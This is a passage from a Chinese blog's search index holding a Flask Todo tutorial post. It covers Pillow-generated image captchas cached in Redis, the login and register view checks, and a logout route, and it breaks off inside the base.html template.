<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>20004</title>
      <link href="/posts/7203.html"/>
      <url>/posts/7203.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-12-27/1609065564543-10343.png" alt="10343"></p><h2 id="Flask-Todo代办事项项目"><a href="#Flask-Todo代办事项项目" class="headerlink" title="Flask Todo代办事项项目"></a>Flask Todo代办事项项目</h2><blockquote><p>1.<a href="https://wenyan.online/2020/12/27/20001-md/" target="_blank" rel="noopener">创建基本视图</a></p><p>2.注册功能</p><p><a href="https://wenyan.online/2020/12/29/20002/" target="_blank" rel="noopener">2.1 基本注册</a></p><p><a href>2.2 邮箱注册(1)</a></p><p><a href>2.3 邮箱注册(2)</a></p></blockquote><h4 id="2-邮箱注册"><a href="#2-邮箱注册" class="headerlink" title="2.邮箱注册"></a>2.邮箱注册</h4><h5 id="0-代码"><a href="#0-代码" class="headerlink" title="0.代码"></a>0.代码</h5><blockquote><p><a href="https://github.com/ningwenyan/Flask_Todo_Demo/tree/v1.04" target="_blank" rel="noopener">https://github.com/ningwenyan/Flask_Todo_Demo/tree/v1.04</a></p></blockquote><h5 id="3-处理验证码"><a href="#3-处理验证码" class="headerlink" title="3.处理验证码"></a>3.处理验证码</h5><blockquote><p>使用<code>pillow</code>生成验证码,如果你不清楚, 请<a href="https://wenyan.online/2020/09/01/login-demo-md/" target="_blank" rel="noopener">参阅</a></p><p>在<code>utils</code>工具包中创建<code>python package</code>,用来捕捉图片</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># utils/captcha/__init__.py</span><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDraw<span class="token punctuation">,</span> ImageFont<span class="token punctuation">,</span> ImageFilter<span class="token keyword">import</span> random<span class="token triple-quoted-string string">"""Image: 创建画布ImageDraw : 创建画笔ImageFont: 画笔字体ImageFilter: 滤镜效果,模糊效果"""</span><span class="token keyword">class</span> <span class="token class-name">Captcha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">30</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">40</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 生成随机字母，根据ASCII表中得到的数据65-90为A-Z的大写字母</span>   @classmethod   <span class="token keyword">def</span> <span class="token function">__gene_rnd_char</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> chr<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 生成颜色</span>   @classmethod   <span class="token keyword">def</span> <span class="token function">__gene_rnd_color_1</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">return</span>   <span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#</span>   @classmethod   <span class="token keyword">def</span> <span class="token function">__gene_rnd_color_2</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">return</span>  <span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">,</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">,</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 生成验证码</span>   <span class="token comment" spellcheck="true"># 使用类方法</span>   @classmethod   <span class="token keyword">def</span> <span class="token function">gene_graph_captcha</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment" spellcheck="true"># 验证码高和宽</span>       width<span class="token punctuation">,</span> height <span class="token operator">=</span> cls<span class="token punctuation">.</span>size       <span class="token comment" spellcheck="true"># 创建图片</span>       image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 验证码字体</span>       font <span class="token operator">=</span> ImageFont<span class="token punctuation">.</span>truetype<span class="token punctuation">(</span>font<span class="token operator">=</span><span class="token string">'app/utils/captcha/Hack-Regular.ttf'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">24</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 创建画笔</span>       draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>image<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 填充</span>       <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token keyword">for</span> y <span class="token keyword">in</span> range<span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>               draw<span class="token punctuation">.</span>point<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>cls<span class="token punctuation">.</span>__gene_rnd_color_1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       text <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>       <span class="token comment" spellcheck="true"># 输出文字</span>       <span class="token keyword">for</span> t <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token comment" spellcheck="true"># 第一个参数是文本的左上角</span>           temp <span class="token operator">=</span> cls<span class="token punctuation">.</span>__gene_rnd_char<span class="token punctuation">(</span><span class="token punctuation">)</span>           draw<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token number">30</span><span class="token operator">*</span>t <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> temp<span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span>cls<span class="token punctuation">.</span>__gene_rnd_color_2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>       real_text <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>text<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 模糊</span>       image <span class="token operator">=</span> image<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>ImageFilter<span class="token punctuation">.</span>GaussianBlur<span class="token punctuation">(</span>radius<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">return</span> <span class="token punctuation">(</span>real_text<span class="token punctuation">,</span> image<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   img <span class="token operator">=</span> Captcha<span class="token punctuation">.</span>gene_graph_captcha<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>img<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   img<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'code.png'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意以上的字体文件,你需要导入自己需要的字体,在相关的文件夹中.</p><hr><p>在<code>commons.views</code>中创建视图,获取图片的数据流,在这之前,先创建一个<code>reids</code>来保存数据</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># utils/captcha_cache.py</span><span class="token keyword">from</span> redis <span class="token keyword">import</span> StrictRedis<span class="token comment" spellcheck="true"># 创建连接</span>redis <span class="token operator">=</span> StrictRedis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.0.101'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> redis<span class="token punctuation">.</span>set<span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> ex<span class="token operator">=</span>timeout<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> redis<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> redis<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   redis<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">,</span>ex<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>redis<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># commons/views.py</span><span class="token keyword">from</span> <span class="token punctuation">.</span> <span class="token keyword">import</span> commons_bp<span class="token keyword">from</span> app<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>captcha <span class="token keyword">import</span> Captcha<span class="token keyword">from</span> app<span class="token punctuation">.</span>utils <span class="token keyword">import</span> captcha_cache<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">from</span> flask <span class="token keyword">import</span> make_response@commons_bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/graph_captcha/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">graph_captcha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   text<span class="token punctuation">,</span> image <span class="token operator">=</span> Captcha<span class="token punctuation">.</span>gene_graph_captcha<span class="token punctuation">(</span><span class="token punctuation">)</span>   captcha_cache<span class="token punctuation">.</span>set<span class="token punctuation">(</span>text<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> text<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   out <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>   image<span class="token punctuation">.</span>save<span class="token punctuation">(</span>out<span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">)</span>   out<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>   resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>out<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   resp<span class="token punctuation">.</span>content_type <span class="token operator">=</span> <span class="token string">'image/png'</span>   <span class="token keyword">return</span> resp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>做好以上工作之后,就可以在前端访问到这个图片</p><pre class="line-numbers language-bash">http://kwenyan.online:8080/commons/graph_captcha/</code></pre><p>同时,可以使用<code>redis</code>图像工具访问到存储的<code>key:value</code></p><hr><p>修改<code>login.html\regsiter.html</code>中关于图片的显示和路由,调整位置以便更好的展示.</p><pre><code class="html"><code class="language-bash">http://kwenyan.online:8080/commons/graph_captcha/</code></pre><p>同时,可以使用<code>redis</code>图像工具访问到存储的<code>key:value</code></p><hr><p>修改<code>login.html\regsiter.html</code>中关于图片的显示和路由,调整位置以便更好的展示.</p><pre><code class="html"><div class="clearfix">        <input type="text" class="form-control" name="code" placeholder="验证码" style="width: 62%; float:left">        <img src="{{ url_for('commons.graph_captcha') }}" alt="code" style="float: right; width: 35%; margin: 4px auto;"></div><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><p>最后一步,需要在<code>auth/views.py</code>中判断验证码是否正确.<code>redis</code>存储的是字节对象,需要转换一下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># auth/views.py</span><span class="token comment" spellcheck="true"># 登录</span>@auth_bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">auth_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   form <span class="token operator">=</span> AuthLoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment" spellcheck="true"># 验证邮箱和密码</span>       user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>email<span class="token operator">=</span>form<span class="token punctuation">.</span>email<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> captcha_cache<span class="token punctuation">.</span>get<span class="token punctuation">(</span>form<span class="token punctuation">.</span>code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> bytes<span class="token punctuation">(</span>form<span class="token punctuation">.</span>code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>               <span class="token triple-quoted-string string">"""               :判断confirm,确定是否要自动登录               :使用 user.seen() 自动更新登录时间               """</span>               <span class="token keyword">if</span> form<span class="token punctuation">.</span>confirmed<span class="token punctuation">.</span>data<span class="token punctuation">:</span>                   login_user<span class="token punctuation">(</span>user<span class="token punctuation">.</span>seen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> remember<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> duration<span class="token operator">=</span>timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token keyword">else</span><span class="token punctuation">:</span>                   login_user<span class="token punctuation">(</span>user<span class="token punctuation">.</span>seen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true"># 判断next</span>               url_next <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"next"</span><span class="token punctuation">)</span>               <span class="token keyword">if</span> url_next <span class="token keyword">is</span> None <span class="token operator">or</span> <span class="token operator">not</span> url_next<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                   url_next <span class="token operator">=</span> url_for<span class="token punctuation">(</span><span class="token string">'main.index'</span><span class="token punctuation">)</span>               <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'main.index'</span><span class="token punctuation">)</span> <span class="token operator">or</span> url_next<span class="token punctuation">)</span>           <span class="token keyword">else</span><span class="token punctuation">:</span>               flash<span class="token punctuation">(</span><span class="token string">"无效的用户名和密码"</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>               <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'auth.auth_login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           flash<span class="token punctuation">(</span><span class="token string">"请输入正确的验证码"</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>           <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'auth.auth_login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'auth/login.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 注册</span>@auth_bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">auth_register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   form <span class="token operator">=</span> AuthRegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> form<span class="token punctuation">.</span>confirmed<span class="token punctuation">.</span>data<span class="token punctuation">:</span>           <span class="token keyword">if</span> captcha_cache<span class="token punctuation">.</span>get<span class="token punctuation">(</span>form<span class="token punctuation">.</span>code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> bytes<span class="token punctuation">(</span>form<span class="token punctuation">.</span>code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>               <span class="token triple-quoted-string string">"""创建用户"""</span>               user <span class="token operator">=</span> User<span class="token punctuation">(</span>email<span class="token operator">=</span>form<span class="token punctuation">.</span>email<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> username<span class="token operator">=</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">,</span> password<span class="token operator">=</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>               user<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true"># 邮件激活</span>               <span class="token comment" spellcheck="true"># 生成token</span>               token <span class="token operator">=</span> user<span class="token punctuation">.</span>generate_confirmation_token<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true"># 将token发送给用户邮箱</span>               sendMail<span class="token punctuation">(</span>user<span class="token punctuation">.</span>email<span class="token punctuation">,</span> <span class="token string">"激活账户"</span><span class="token punctuation">,</span> <span class="token string">'confirm'</span><span class="token punctuation">,</span> user<span class="token operator">=</span>user<span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>               flash<span class="token punctuation">(</span><span class="token string">"请通过注册邮箱激活账户!"</span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">)</span>               <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'main.index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token keyword">else</span><span class="token punctuation">:</span>               flash<span class="token punctuation">(</span><span class="token string">"请输入正确的验证码"</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>               redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'auth.auth_register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token triple-quoted-string string">"""同意协议"""</span>           flash<span class="token punctuation">(</span><span class="token string">"请阅读同意注册协议"</span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">)</span>           redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'auth.auth_register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'auth/register.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr></blockquote><h5 id="4-修改base-html导航栏"><a href="#4-修改base-html导航栏" class="headerlink" title="4.修改base.html导航栏"></a>4.修改<code>base.html</code>导航栏</h5><blockquote><p>先让我们把注销路由做出来</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># auth/views.py</span><span class="token comment" spellcheck="true"># 注销</span>@auth_bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout/'</span><span class="token punctuation">)</span>@login_required<span class="token keyword">def</span> <span class="token function">auth_logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'main.index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在基本的登录框架有了,就可以从新制作导航栏.</p><pre class="line-numbers language-html"><code class="language-html">{% from 'bootstrap/nav.html' import render_nav_item %}<span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ csrf_token() }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>       {% block title %}>          >          {% endblock %}   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>shortcut icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>favicon.ico<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image/x-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>favicon.ico<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image/x-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>css/base.css<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>css/bootstrap.min.css<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token 